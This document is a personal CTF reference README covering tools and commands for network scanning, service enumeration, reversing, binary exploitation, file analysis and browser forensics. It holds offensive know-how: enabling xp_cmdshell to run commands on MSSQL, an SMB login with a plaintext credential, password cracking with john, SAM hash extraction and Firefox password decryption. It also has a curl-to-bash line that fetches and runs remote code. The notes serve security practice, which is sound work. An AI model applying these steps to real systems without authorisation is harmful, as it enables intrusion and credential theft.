

StarlightCTF is a repository containing **notes** pointing to ideas and resources. It's purpose is to help the user (usually me) to find solutions to **security-related challenges** and provide some tools to use when offline.

The resources that I use most often are marked with a heart <span style="color:red">❤️</span> symbol.

This database was inspired by [CTF Katana](https://github.com/JohnHammond/ctf-katana) (unmaintained) and [HackTricks](https://book.hacktricks.xyz) (pentest-oriented). It usually contains a **brief description** of the idea/tool and **pointers** to more in-depth content.

Most of the tools here are written in [Python](https://www.python.org/) and are designed to be used in a [Linux](https://www.linux.org/) (or [WSL](https://learn.microsoft.com/en-us/windows/wsl/install)) environment.

This file is auto generated using [build.py](build.py). To update it, update the README.md files in the subdirectories and run the build.py script.

# Table of Contents
* [Network](#network)
* [Services and Ports](#services-and-ports)
* [Reverse Engineering](#reverse-engineering)
* [Binary Exploitation](#binary-exploitation)
* [Files](#files)
* [Forensics](#forensics)
* [Cryptography](#cryptography)
* [Web](#web)
* [Pentest](#pentest)
* [Jail Break](#jail-break)
* [Steganography](#steganography)
* [OSINT](#osint)
* [Miscellaneous](#miscellaneous)
* [Other Resources](#other-resources)

<br><br>

# Network

⇨ [Network Scanning](#network-scanning)<br>
⇨ [DNS Exfiltration](#dns-exfiltration)<br>


This section present some tools to analyse networks and network traffic. The `Services and Ports` section and the `Pentest` section can also be useful for network related tasks.

* `Wireshark` <span style="color:red">❤️</span> - [Website](https://www.wireshark.org/)
	The go-to tool for examining [`.pcap`](https://en.wikipedia.org/wiki/Pcap) files.


* `PCAPNG File format` - [GitHub](https://github.com/pcapng/pcapng)
	Some tools do not support the [PCAPNG](https://github.com/pcapng/pcapng) file format. It can be converted to PCAP with [this online tool](http://pcapng.com/) or with the `editcap` command that comes with [Wireshark](https://www.wireshark.org/).
	
	```bash
	editcap old_file.pcapng new_file.pcap
	```

* `tcpflow` - [GitHub](https://github\.com/simsong/tcpflow)

	A command-line tool for reorganizing packets in a PCAP file and getting files out of them. __Typically it gives no output, but it creates the files in your current directory!__

	```
	tcpflow -r my_file.pcap
	ls -1t | head -5 # see the last 5 recently modified files
	```

* `PcapXray` - [GitHub](https://github.com/Srinivas11789/PcapXray) 
	A GUI tool to visualize network traffic.
	



## Network Scanning



* `Private IPs`

    Some ip ranges are reserved for private networks. They are not routable on the internet. They are:

    | Network | Range | Count |
    | --- | --- | --- |
    | `10.0.0.0/8` | `10.0.0.0` – `10.255.255.255` | 16,777,214 |
    | `172.16.0.0/16` | `172.16.0.0` - `172.31.255.255` | 1,048,574 |
    | `192.168.0.0/16` | `192.168.0.0` - `192.168.255.255` | 65,534 |

#### NMAP

* `nmap` - [Website](https://nmap.org/)

    `nmap` is a utility for network discovery.

	```bash
	nmap -sC -sV -O 192.168.0.0/24 # Classic scan
	nmap -sS 192.168.0.0/24        # SYN scan (faster but no service detection)
	```

* Large range ports

    `nmap` usually scans the 1000 most common ports. To scan more ports, use the `-p` option. This can increase the scan time, so it is best to use it on a few machines at a time.

    ```bash
    nmap 192.168.0.0 -p- # Scan all ports, from 1 to 65535
    nmap 192.168.0.0 -p 1-1000,2000-3000 # Scan ports 1 to 1000 and 2000 to 3000
    ```


* `Nmap scripts` - [Website](https://nmap.org/nsedoc/scripts/)
  
	`nmap` has a lot of scripts that can be used to scan for specific vulnerabilities. They are called with the `--script` option.

	```bash
	nmap -sV --script dns-* <ip> # Run all dns scripts
	```

#### Tools

* `traceroute` - [Wikipedia](https://en.wikipedia.org/wiki/Traceroute)

    See the machines that a packet goes through to reach its destination.

* `netdiscover`

    `netdiscover` is a utility for network discovery.

    ```bash
    # Passive scan
    netdiscover -p
    ```



## DNS Exfiltration



DNS can be used to exfiltrate data, for example to bypass firewalls.

* `iodine` - [GitHub](https://github.com/yarrick/iodine)

    Can be identified by the presence of the "Aaahhh-Drink-mal-ein-Jägermeister" or "La flûte naïve française est retirée à Crête".<br>
    Can be deciphered with [this script](Network/DNS Exfiltration/Tools/iodine/exploit.py)<br>
    [Hack.lu CTF WU](http://blog.stalkr.net/2010/10/hacklu-ctf-challenge-9-bottle-writeup.html)

* `DNScat2` - [GitHub](https://github.com/iagox86/dnscat2)

    Can be identified when [file signatures](#file-scanning) are present in the DNS queries.
    Data can be extracted with [this script](Network/DNS Exfiltration/Tools/dnscat2/exploit.py) and files can be extracted with [binwalk](#file-scanning).





<br><br>

# Services and Ports



Assigned port numbers by IANA can be found at [IANA Port Numbers](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml). But other services can also run on these ports.




FTP - File Transfer Protocol - 21/tcp
-------------------------------------

Transfer files between a client and server.
The anonymous credentials are anonymous:anonymous.

```bash
ftp <ip> <port>  # Connect to a server
nmap -v -p 21 --script=ftp-anon.nse <ip> # Enumerate anonymous logins
```


SSH - Secure Shell - 22/tcp
---------------------------

Securely connect to a remote server.

```bash
## Connections
ssh <user>@<ip> -p <port> # Connect to a server
ssh -L <local_port>:<remote_host>:<remote_port> <user>@<ip> # Port forwarding

## Transfer files
scp <file> <user>@<ip>:<path>   # Local to remote
scp <user>@<ip>:<path> <file>   # Remote to local
scp -r <dir> <user>@<ip>:<path> # whole directory
```

DNS - Domain Name System - 53/udp
---------------------------------

DNS is used to resolve domain names to IP addresses. `BIND` is the most common DNS implementation.

* `nslookup` - [Wikipedia](https://en.wikipedia.org/wiki/Nslookup)

	Query a DNS server for information about a domain name.

* `dig` - [Wikipedia](https://en.wikipedia.org/wiki/Dig_(command))

	Query a DNS server for information about a domain name.

* `Zone transfer attack` - [Wikipedia](https://en.wikipedia.org/wiki/DNS_zone_transfer)

	Zone transfer is a method of transferring a copy of a DNS zone from a DNS server to another DNS server. This can be used to enumerate DNS records of a hidden zone if we know one of it's domain.

	To perform a zone transfer, use `dig` with the `axfr` option.
	```bash
	dig axfr @<dns-server> <domain>
	```

HTTP(S) - Hypertext Transfer Protocol - 80/tcp 443/tcp
------------------------------------------------------


See [Web](#web) for more information.


POP3 - Post Office Protocol - 110/all
-------------------------------------

POP3 is used to retrieve emails from a server.


SMB - Samba - 445/all
---------------------

Samba is a free and open-source implementation of the SMB/CIFS network protocol. It allows file and printer sharing between Linux and Windows machines.

A smb server can have multiple **shares** (~partition) with their own permissions. They can be listed with `smbmap` or `enum4linux` and accessed with `smbclient`.

* `smbmap` - [GitHub](https://github\.com/ShawnDEvans/smbmap)

	Emumerate SMB shares and their permissions.

	```bash
	smbmap -H <ip> -u anonymous                       # List shares as anonymous user
	smbmap -H 10.10.10.125 -u <user> -p <password>    # Logged in as a user
	smbmap -H 10.10.10.125 -u <user> -p <password> -r # List everything recursively

	# When NO_LOGON_SERVERS is returned, try with the localhost domain
	smbmap -H 10.10.10.125 -u <user> -d localhost # With domain specified
	```

* `enum4linux` <span style="color:red">❤️</span>

	Enumerate SMB shares and their permissions.

	```bash
	enum4linux 10.10.10.125
	```

* `smbclient`

	Access SMB shares. You can use the `-m SMB2` option to force SMB2 protocol on weird servers.

Connect a share and enter the smb CLI:
```
smbclient \\\\10.10.139.198\\admins -U "ubuntu%S@nta2022"
```
Here you can use regular linux commands to navigate and `get`, `put` to transfer data.

LDAP - Lightweight Directory Access Protocol 389/all ldaps 636/all
-----------------------------------------------------------------

LDAP is used to store information about **users**, computers, and other resources. It is used by Active Directory.

A ldap DN (distinguished name) is a string that identifies a resource in the LDAP directory. It is composed of a series of RDNs (Relative Distinguished Names) separated by commas. Each RDN is composed of an attribute name and a value. For example, the DN `CN=John Doe,OU=Users,DC=example,DC=com` identifies the user `John Doe` in the `Users` organizational unit of the `example.com` domain.

The different attribute names are :

| Attribute | Description |
|-----------|-------------|
| `CN` | Common name |
| `L` | Locality name |
| `ST` | State or province name |
| `O` | Organization name |
| `OU` | Organizational unit name |
| `C` | Country name |
| `STREET` | Street address |
| `DC` | Domain component |
| `UID` | User ID |


* `ldapsearch` - [Website](https://linux.die.net/man/1/ldapsearch)

	`ldapsearch` is a command line tool for querying LDAP servers.

	Anonymously query a LDAP server for information about a domain name.
	```bash
	ldapsearch -H ldap://<ip>:<port> -x -s base '' "(objectClass=*)" "*" + # Without DN
	ldapsearch -H ldap://<ip>:<port> -x -b <DN> # With DN
	```


SQL - Structured Query Language
-------------------------------

| Port | Service | Description |
|------|---------|-------------|
| 1433 | MSSQL | Microsoft SQL Server |
| 3306 | MySQL | MySQL Database |
| 5432 | PostgreSQL | PostgreSQL Database |



MSSQL - Microsoft SQL Server - 1433/tcp
---------------------------------------

* `impacket` -> `mssqlclient.py`

	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:

```
mssqlclient.py username@10.10.10.125
```

It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**

```
mssqlclient.py username@10.10.10.125 -windows-auth
```

If you have access to a Microsoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:

```
SQL> enable_xp_cmdshell
```

though, you may not have permission. If that DOES succeed, you can now run commands like:

```
SQL> xp_cmdshell whoami
```

SNMP - Simple Network Management Protocol 161/udp 162/udp
---------------------------------------------------------

* snmp-check

```
snmp-check 10.10.10.125
```

RSYNC - 873/tcp
---------------



* `rsync` - [Wikipedia](https://en.wikipedia.org/wiki/Rsync) [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)

	`rsync` is a utility for transferring and synchronizing files.

	```bash
	# Enumerate modules
	nmap -sV --script "rsync-list-modules" -p <port> <ip>

	# List files in a module (anonymous)
	rsync -av --list-only rsync://10.0.0.2/module

	# Download files from a module
	rsync -avz rsync://10.0.0.2/module ./outdir

	# Authenticated connection
	rsync -avz <user>@<ip>::<module> <local_path> # Download files from a module
	rsync -avz <local_path> <user>@<ip>::<module> # Upload files to a module
	```




<br><br>

# Reverse Engineering

⇨ [Binaries](#binaries)<br>
⇨ [Virtualization](#virtualization)<br>
⇨ [Python](#python)<br>
⇨ [Android](#android)<br>


Reverse engineering is the process of analyzing a system, device or program in order to extract knowledge about it. It is a broad field that can be divided into two main categories: **static** and **dynamic** analysis.

The [Binary Exploitation](Binary%20Exploitation) section, also known as PWN, is dedicated to altering the behavior of a program by exploiting vulnerabilities in it. The 





* Punchcards

	[Punch card emulator](http://tyleregeto.com/article/punch-card-emulator)


* GameBoy ROMS

	Packages to run GameBoy ROMS: `visualboyadvance` or `retroarch`


## Binaries

⇨ [Golang](#golang)<br>


Reversing binaries can be used to solve keygen (or crackme) challenges, or just to understand how a program works to [exploit it](#binary-exploitation).


* `strace` - [Website](https://strace.io)

	Report library, system calls and signals.

* `ltrace` - [Manual](http://man7.org/linux/man-pages/man1/ltrace.1.html)

* `gdb` <span style="color:red">❤️</span> - [Wikipedia](https://en.wikipedia.org/wiki/GNU_Debugger) [CheatSheet](https://raw.githubusercontent.com/zxgio/gdb_gef-cheatsheet/master/gdb_gef-cheatsheet.pdf)

	Most used debugger, can be improved with [GEF](https://hugsy.github.io/gef/) <span style="color:red">❤️</span> or [PEDA](https://github.com/longld/peda). Here are the most common commands:


	```bash
	bash -c "$(curl -fsSL https://gef.blah.cat/sh)" # Install GEF on top of gdb
	gdb <binary> # Start gdb

	# Start debugging
	run <args> # Run the program with arguments
	run < <file> # Run the program with input from a file
	run <<< $(python -c 'print("A"*100)') # Run the program with input from a command

	# Display info
	info functions # List all functions
	disassemble <function> # Disassemble a function
	disassemble # Disassemble the current function
	x/64x <address> # Display the content of the memory at an address
	x/64x $esp # Display the content of the stack

	# Breakpoints
	break <function> # Set a breakpoint at the beginning of a function
	break * <address> # Set a breakpoint at an address

	# Execution
	n[ext] # Execute the next source instruction, goes into functions
	s[tep] # Execute the next source instruction, does not go into functions
	c[ontinue] # Continue execution until the next breakpoint
	n[ext]i # Execute the next machine instruction, goes into functions
	s[tep]i # Execute the next machine instruction, does not go into functions
	reverse-{s[tep][i], n[ext][i]} # Reverse execution

	# Registers
	info registers # Display the content of the registers
	set $<register> = <value> # Set the value of a register

	# Checkpoints
	checkpoint # Create a checkpoint
	info checkpoints # List all checkpoints
	restart <checkpoint id> # Restart the program at a checkpoint
	delete checkpoint <checkpoint id> # Delete a checkpoint
	```

* `Ghidra` <span style="color:red">❤️</span> - [Website](https://ghidra-sre.org/)

	Decompiler for binary files, useful for **static** analysis.

	Automatically create a ghidra project from a binary file using [this script](Reverse Engineering/Binaries/Tools/ghidra.py):
	```bash
	ghidra.py <file>
	```

* `angr` - [Website](https://angr.io/) [GitHub](https://github.com/angr/angr)

    Tool for **dynamic** analysis. Can be used to solve keygen challenges automatically using symbolic execution. 
    
    Requires some time to fully understand.

* `Hopper` - [Website](https://www.hopperapp.com)

	Disassembler.

* `Binary Ninja` - [Website](https://binary.ninja)

	Good for multithreaded analysis.


* `IDA` <span style="color:red">❤️</span> - [Website](https://www.hex-rays.com/products/ida/support/download.shtml)

	Proprietary reverse engineering software, known to have the best disassembler. The free version can only disassemble 64-bit binaries.

* `radare2` - [GitHub](https://github.com/radareorg/radare2)

	Binary analysis, disassembler, debugger. Identified as `r2`.

### Golang



[GO](https://go.dev) is a compiled programming language developed by google as a high level alternative to C. It is statically typed and compiled to machine code.

Function are named after the library they are from. For example, function from the standard I/O library are `fmt.<function>`. The main function is called `main.main`.

When the binary is stripped, the function's information is stored in the `.gopclntab` section. 







## Virtualization



In order to run some system, it is necessary to use virtualization.



## Python




* `Decompile .pyc files`

	Several software can be used to decompile python bytecode.

	| Software | Source | Notes |
	| --- | --- | --- |
	| `uncompyle6` | [GitHub](https://github\.com/rocky/python-uncompyle6/) | Decompiles Python bytecode to equivalent Python source code. Support python versions **up to to 3.8**. Legend has it that it exists an option (maybe -d) that can succeed when the regular decompilation fails. |
	| `Decompyle++` <span style="color:red">❤️</span> | [GitHub](https://github.com/zrax/pycdc) | Less reliable, but can decompile every python3 versions. |
	| `Easy Python Decompiler` | [Website](https://sourceforge.net/projects/easypythondecompiler/) | Windows GUI to decompile python bytecode. |


* `Pyinstaller Extractor` - [GitHub](https://github.com/extremecoders-re/pyinstxtractor)

	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.

	```bash
	python3 pyinstxtractor.py <filename>
	```

	An alternative is `pydumpck`



## Android



* `Android Studio` - [Website](https://developer.android.com/studio)

    Main IDE for Android development. Java and Kotlin can be used.

* `jadx` <span style="color:red">❤️</span> - [GitHub](https://github.com/skylot/jadx)

    Decompiles Android APKs to Java source code. Comes with a GUI.

	```bash
	jadx -d "$(pwd)/out" "$(pwd)/<app>" # Decompile the APK to a folder
	```

* `apktool` - [Website](https://ibotpeaches.github.io/Apktool/)

	A command-line tool to extract all the resources from an APK file.

	```bash
	apktool d <file.apk> # Extracts the APK to a folder
	```


* `dex2jar` - [GitHub](https://github.com/pxb1988/dex2jar)

	A command-line tool to convert a J.dex file to .class file and zip them as JAR files.


* `jd-gui` - [GitHub](https://github.com/java-decompiler/jd-gui)

	A GUI tool to decompile Java code, and JAR files.



<br><br>

# Binary Exploitation

⇨ [ELF](#elf)<br>
⇨ [Windows](#windows)<br>


Binary exploitation, also known as **pwn**, is the art of exploiting vulnerable programs. This means that given a program, often running on a remote server, an attacker is able to take control of the execution flow of the program only using limited user input. The goal of the attacker is usually to get a shell on the remote server, but it sometimes not necessary to compromise the server.

### Exploit types

Different types of exploit exists, the most common are:

| Name | Description |
| ---- | ----------- |
| [Format String](Binary Exploitation/Tools/bin_exp/6-format_string_vulns/) | Exploits format string functions to read and write in the program memory |
| [Overwriting stack variables](Binary Exploitation/Tools/bin_exp/1-overwriting_stack_variables/) | Change the value of a variable on the stack. |
| [ret2win](Binary Exploitation/Tools/bin_exp/3-ret2win_with_params/) | Overwrite the return address to point to an interesting function of the program |
| [Shellcode](Binary Exploitation/Tools/bin_exp/4-injecting_custom_shellcode/) | Inject shellcode in the program memory and execute it |
| [ret2libc](Binary Exploitation/Tools/bin_exp/5-return_to_libc/) | Overwrite the return address to point to an interesting function in libc |
| [Overwriting GOT](Binary Exploitation/Tools/bin_exp/8-overwriting_got/) | Overwrite the address of a function in the GOT to point to an interesting function |


### Exploit mitigations

But some security techniques exists and can make exploitation harder:

- ASLR<br>
    Randomization of the memory addresses of the program and the libraries.
    Solution: Leak an address and calculate the offset between the leaked address and the address of the function you want to call.

- NX<br>
    No execution of the stack.

- Stack canaries<br>
    A random value is stored on the stack and checked before returning from a function.
    Solution: [Leak the canary](Binary Exploitation/Tools/bin_exp/9-bypassing_canaries/) and overwrite it with the correct value.

- PIE<br>
    Randomization of the memory addresses of the program.
    Solution: [Leak an address](Binary Exploitation/Tools/bin_exp/7-leak_pie_ret2libc/)


### Tools

Common tools to exploit binaries:

* `gdb` - [Wikipedia](https://en.wikipedia.org/wiki/GNU_Debugger)

    Most popular debugger for **dynamic** analysis.
    See [Reverse Engineering](#reverse-engineering) for more info.

* `Ghidra` - [Website](https://ghidra-sre.org/)

	Decompiler for binary files, useful for **static** analysis.
	See [Reverse Engineering](#reverse-engineering) for more info.


### Common attacks

* `---x--x--x root root`

    To exfiltrate or read a binary when you only have **execution rights**, you can load it with a library and use the library to read it.

    This needs that the binary is **dynamically linked**, and is easier if you know the name of the function you want to extract.

    Code for this library is provided [here](Binary Exploitation/Tools/exec_only_dumper).

    [CTF time WU](https://ctftime.org/writeup/7670)<br>
    [DGHack 2022 WU](https://remyoudompheng.github.io/ctf/dghack2022/wanna_more_features.html)

## ELF



* `checksec` [Docs](https://docs.pwntools.com/en/stable/commandline.html)

    A command-line tool that will check the security mechanisms of a binary.
    
* `pwntools` [Docs](https://docs.pwntools.com/en/stable/about.html)

    A python library that can be used to interact with a binary.

* `ROPgadget` - [GitHub](https://github.com/JonathanSalwan/ROPgadget)  [Pypi](https://pypi.org/project/ROPGadget/)

    A command-line tool that can be used to find gadgets in a binary.

* `ropper` - [GitHub](https://github.com/sashs/Ropper)

    A command-line tool that can be used to find gadgets in a binary.




## Windows




#### Tools

* `winchecksec` - [GitHub](https://github\.com/trailofbits/winchecksec)

	Checks the security features of a Windows binary.

* `wine` <span style="color:red">❤️</span> - [Website](https://www.winehq.org/)

	Runs Windows programs on Linux.

* `winedbg` - [Website](https://www.winehq.org/)

	Debugger for Windows programs on Linux.

	Debug a Windows program on Linux with `winedbg` in gdb mode:
	```bash
	winedbg --gdb <program>
	```

* `gdb server for wine` - [Website](https://www.gnu.org/software/gdb/)

	Remote debugger inside wine. The (very large) package is called `gdb-mingw-w64` on most Linux distributions.

	Start a gdb server inside wine: ([found here](https://stackoverflow.com/questions/39938253/how-to-properly-debug-a-cross-compiled-windows-code-on-linux))
	```bash
	wine Z:/usr/share/win64/gdbserver.exe localhost:12345 myprogram.exe
	x86_64-w64-mingw32-gdb myprogram.exe
	```

* `Immunity Debugger` - [Website](https://www.immunityinc.com/products/debugger/)

	Debugger for Windows programs. I recommend using only GDB in order to learn less commands.

* `pefile` - [GitHub](https://github\.com/erocarrera/pefile)

	Get info about PE files.

* `dnSpy` - [GitHub](https://github.com/0xd4d/dnSpy) 
	
	.NET debugger and assembly editor.

* `PEiD` - [Website](https://www.aldeid.com/wiki/PEiD)

	Detects packers, cryptors, compilers, etc.

* jetBrains .NET decompiler

	exists

* `AutoIt` - [Website](https://www.autoitscript.com/site/autoit/)

	Scripting language for Windows.


<br><br>

# Files

⇨ [File Scanning](#file-scanning)<br>
⇨ [Images](#images)<br>
⇨ [PDF Files](#pdf-files)<br>
⇨ [ZIP Files](#zip-files)<br>


This section contains information about different file formats and their structure. It is always good to keep this in mind, especially for forensics investigations.

## File Scanning



File scanning is the process of analyzing a, potentially large, file to find information about it. This can be useful to find hidden data, or to simply find the data type and structure of a file.

#### Tools

* `file`

    Deduce the file type from the headers.

* `binwalk` <span style="color:red">❤️</span>

    Look for embedded files in other files.

    
    ```bash
    binwalk <file>            # List embedded files
    binwalk -e <file>         # Extract embedded files
    binwalk --dd=".*" <file>  # Extract all embedded files
    ```
    Alternatives: `foremost`, `hachoir-subfile`...

* `strings`

    Extract strings from a file.

* `grep`

    Search for a string, or regex, in a file.

	```bash
	grep <string> <file>          # Search in a file
	grep -r <string> <directory>  # Search recursively in a directory
	```

* `hexdump`

	Display the hexadecimal representation of a file.

	```bash
	hexdump -C <file>  # Dump bytes with address and ascii representation
	hexdump <file>     # Dump bytes with address only
	xxd -p <file>      # Dump only bytes
	```

* `yara` - [Website](https://virustotal.github.io/yara/)

    Scan a file with Yara rules to find (malicious) patterns. rules can be found in the [Yara-Rules](https://github.com/Yara-Rules/rules) repository.

    Here is an exemple rule to find a PNG file in a file:

    png.yar
    ```
    rule is_png {
        strings:
            $png = { 89 50 4E 47 0D 0A 1A 0A }
        condition:
            $png
    }
    ```

    ```bash
    yara png.yar <file>  # Scan a file, outputs rule name if match
    yara -s png.yar <file>  # Print the offset and the matched strings
    ```

#### File signatures

* `file signatures` - [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

    File signatures are bytes at the beginning of a file that identify the file type. This header is also called magic numbers.

    Most files can be [found here](https://en.wikipedia.org/wiki/List_of_file_signatures), but the most common ones are :

    | Hex signature | File type | Description |
    | --- | --- | --- |
    | `FF D8 FF` (???) | JPEG | [JPEG](https://en.wikipedia.org/wiki/JPEG) image |
    | `89 50 4E 47 0D 0A 1A 0A` (?PNG) | PNG | [PNG](https://en.wikipedia.org/wiki/Portable_Network_Graphics) image |
    | `50 4B` (PK) | ZIP | [ZIP](https://en.wikipedia.org/wiki/Zip_(file_format)) archive |

    For exemple, the first 16 bytes of PNG are usually b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR'



## Images

⇨ [PNG](#png)<br>


* `pngcheck`

	Check if a **PNG** file is valid. If it is not, displays the error.


* `pngcsum` - [Website](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)

	Correct the CRCs present in a **PNG** file.


* `PNG Check & Repair Tool` - [GitHub](https://github.com/sherlly/PCRT)

	Correct a corrupted PNG file.

	Utility to try and correct a **PNG** file. 

	*Need to press enter to show the file.*


* `Reading the specifications` <span style="color:red">❤️</span>

	Reading the specification of image format are sometimes the only way to fix a corrupted image.

	| File type | Summary | Full Specification |
	| --- | --- | --- |
	| PNG | [Summary](https://github.com/corkami/formats/blob/master/image/png.md) | [Full Specification](https://www.w3.org/TR/PNG/) |
	| JPEG | [Summary](https://github.com/corkami/formats/blob/master/image/jpeg.md) | [Full Specification](https://www.w3.org/Graphics/JPEG/itu-t81.pdf) |

#### Online tools

* [Forensically](https://29a.ch/photo-forensics/#forensic-magnifier)

	*Forensically* is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analysis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.


### PNG



[PNG](https://en.wikipedia.org/wiki/Portable_Network_Graphics) is a raster graphics file format that supports lossless data compression.


##### Tools

* PNG data after IEND chunk in cropped image

    Badly cropped PNG image can leave the cropped data after the IEND chunk. This can be spotted when there are two IEND chunks in a file. This can leak data from the original image, such as in the `aCropalypse` (CVE-2023-21036) vulnerability.

    [This github repository](https://github.com/Absenti/acropalypse_png) can help to extract the data. [This GUI tool](https://github.com/frankthetank-music/Acropalypse-Multi-Tool) can also be used.





## PDF Files




* `pdfinfo` - [Website](https://poppler.freedesktop.org/)

	A command-line tool to get a basic synopsis of what the [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file is.

	```bash
	# Extract all javascript from a PDF file
	pdfinfo -js input.pdf
	```

* `pdf-parser` <span style="color:red">❤️</span> - [Website](https://blog.didierstevens.com/programs/pdf-tools/)

	Parse a PDF file and extract the objects.

	```bash
	# Extract stream from object 77
	python pdf-parser.py -o 77 -f -d out.txt input.pdf
	```

* `qpdf` - [GitHub](https://github\.com/qpdf/qpdf)

	A command-line tool to manipulate [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) files. Can extract embedded files.

* `pdfcrack` - [Website](https://pdfcrack.sourceforge.net/)

	A command-line tool to recover a password from a PDF file. Supports dictionary, wordlists, and bruteforce.

* `pdfimages` - [Website](https://poppler.freedesktop.org/)

	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.

* `pdfdetach` - [Website](https://www.systutorials.com/docs/linux/man/1-pdfdetach/)

	A command-line tool to extract files out of a [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file.



## ZIP Files



* `zip2john` <span style="color:red">❤️</span>

    Brute force password protected zip files.

    ``` bash
    zip2john protected.zip > protected.john
    john --wordlist=/usr/share/wordlists/rockyou.txt protected.john
    ```

* `bkcrack` - [GitHub](https://github\.com/kimci86/bkcrack)

    Crack ZipCrypto Store files. Need some plaintext to work.

* `Reading the specifications`

	Reading the specification of image format are sometimes the only way to fix a corrupted ZIP. A summary of this specification can be found on [GitHub](https://github.com/corkami/formats/blob/master/archive/ZIP.md)




<br><br>

# Forensics

⇨ [Disk Image](#disk-image)<br>
⇨ [Browser Forensics](#browser-forensics)<br>
⇨ [Logs](#logs)<br>
⇨ [Android Forensics](#android-forensics)<br>
⇨ [Memory Dump](#memory-dump)<br>
⇨ [Docker](#docker)<br>



* `File scanning`

	Use [this section](#file-scanning) to find information about files.


* Keepass

	`keepassx` can be installed on Ubuntu to open and explore Keepass databases. Keepass databases master passwords can be cracked with `keepass2john`.


* `VS Code Hex editor` - [Website](https://marketplace.visualstudio.com/items?itemName=ms-vscode.hexeditor)

	An extension for VS Code that allows you to view and edit files in hexadecimal format.

* `ImHex` - [Website](https://github.com/WerWolv/ImHex)

	An hex editor that supports patterns (ex PNG). Watch out for the unfriendly UX but it's free and works.

* `WIM` : Windows Imaging Format - [Wikipedia](https://en.wikipedia.org/wiki/Windows_Imaging_Format)

	Compressed format that can be found in windows installation media. 
	
	Can be mounted or extracted with [`wimlib`](https://wimlib.net/) tools. `wimlib` is a package on most linux distributions.

	```bash
	wiminfo <file.wim> # List all images in the wim file
	wimapply <file.wim> <image_index> <output_directory> # Extract an image from the wim file
	``` 

* `Prefetch files` - [Wikipedia](https://en.wikipedia.org/wiki/Prefetcher#Prefetch_files)

	Windows stores information about the programs that are run in a prefetch file. This information can be used to determine what programs were run on a system. The prefetch files are stored in `C:\Windows\Prefetch\` and have the extension `.pf`. 
	
	It can be parsed using `PECmd` from [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md). Win10 prefetch files can only be parsed on Win8+ systems, wine will not work for this.

## Disk Image



#### Tools

* `Autopsy` <span style="color:red">❤️</span> - [Website](https://www.autopsy.com/download/)

    GUI for analyzing disk images with Sleuthkit. It can be used to extract files, search for keywords, etc...

* `mount`

    Mount a disk image to a filesystem.
    
    I recommend to use a virtual machine to mount the disk image. This way you can browse the filesystem and extract files without risking to damage your system.

* `TestDisk` - [Website](https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2) 
	
    CLI tool to recover lost partitions and/or make non-booting disks bootable again.

* `photorec` - [Website](https://www.cgsecurity.org/wiki/PhotoRec) 
	
    CLI tool to recover deleted files. Works with raw data, so the disk do not need to have a partition system working.

#### Techniques

* Extract windows hashes from filesystem (SAM file).

    This can be done with `samdump2`. See this [GitHub repository](https://github.com/noraj/the-hacking-trove/blob/master/docs/Tools/extract_windows_hashes.md) for more information.


#### Data formats

* `WIM` : Windows Imaging Format - [Wikipedia](https://en.wikipedia.org/wiki/Windows_Imaging_Format)

    WIM is a file format used for windows disk images. Data can be extracted on linux using `wimlib`.

	```bash
	wiminfo <file.wim> # List all images in the wim file
	wimapply <file.wim> <image_index> <output_directory> # Extract an image from the wim file
	``` 






## Browser Forensics

⇨ [Firefox profiles](#firefox-profiles)<br>


The browser profile contains a lot of information about the user, such as bookmarks, history, cookies, stored passwords, etc.


* Profile location
    
    In Windows:
    | Browser | Location |
    | --- | --- |
    | Chrome | `C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default` |
    | [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>` |
    | Edge | `C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default` |

    In Linux:
    | Browser | Location |
    | --- | --- |
    | Chrome | `~/.config/google-chrome/Default` |
    | [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `~/.mozilla/firefox/<profile>` |




### Firefox profiles



Firefox based browsers (and Thunderbird) store their profiles in the following files in the profile folder (usually `XXXXXXXX.default`):

| File | Description |
| --- | --- |
| `places.sqlite` | Bookmarks, history, cookies, etc... |
| `keyN.db` with N=3 or 4 | Master password, used to encrypt the stored passwords |
| `signons.sqlite` or `logins.json` | Stored passwords |
| `certN.db` with N=8 or 9 | Certificates |

* `Dumpzilla` <span style="color:red">❤️</span> - [GitHub](https://github.com/Busindre/dumpzilla)

    Dumps everything from a Firefox profile. 

    ```bash
    python3 dumpzilla.py /path/to/your-profile/
    ```
    
    Uses [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which can be hard to install.


* `Firefox decrypt` - [GitHub](https://github.com/unode/firefox_decrypt)

    Decrypts passwords from Firefox. Better support than dumpzilla but don't handle legacy profiles (key3.db).

    ```bash
    python3 firefox_decrypt.py /path/to/your-profile/
    ```

    Uses [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which can be hard to install. Similar to [nss-password](https://github.com/glondu/nss-passwords) which can be installed with a .deb file.

* `FirePWD` - [GitHub](https://github.com/lclevy/firepwd)

    Decrypt all types of firefox passwords (including legacy).

    ```bash
    python3 firepwd.py -d /path/to/your-profile/
    ```

